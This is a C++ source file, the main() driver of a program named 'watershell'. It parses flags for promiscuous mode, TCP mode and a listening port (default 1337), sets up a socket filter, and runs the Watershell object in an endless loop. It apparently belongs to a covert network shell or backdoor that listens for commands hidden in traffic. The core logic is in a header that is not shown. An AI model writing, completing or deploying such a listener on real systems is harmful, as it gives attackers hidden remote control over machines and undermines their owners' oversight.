#include "watershell.h"

int main(int argc, char *argv[]) {

  bool DEBUG = true;
  bool PROMISC = false;
  bool TCP_MODE = false;
  int port = 1337;

  int arg;
  struct sock_fprog filter;
  char buf[2048];
  unsigned char *read;

  while ((arg = getopt(argc, argv, "phtl:")) != -1){
    switch (arg){
        case 'p':
            if (DEBUG)
                std::puts("Running in promisc mode");
            PROMISC = true;
            break;

        case 't':
            if (DEBUG)
                std::puts("TCP mode (experimental)");
            TCP_MODE = true;
            break;

        case 'h':
            if (DEBUG)
                std::cerr << "Usage: " << argv[0] << "[-l port] [-p] -i iface" << std::endl;
            return 0;
            break;
        case 'l':
            port = strtoul(optarg, NULL, 10);
            if (port <= 0 || port > 65535){
                if (DEBUG)
                    std::puts("Invalid port");
                return 1;
            }
            break;
        case '?':
            if (DEBUG)
                std::cerr << "Usage: " << argv[0] << "[-l port] [-p] -i iface" << std::endl;
            return 1;
        default:
            std::abort();
    }
  }
  std::cout << port << std::endl;
  Watershell wtrshl(port, DEBUG, PROMISC, TCP_MODE);
  wtrshl.Init();
  std::cout << wtrshl.gateway_mac << std::endl;
  while(true){
    wtrshl.RunOnce();
  }
}
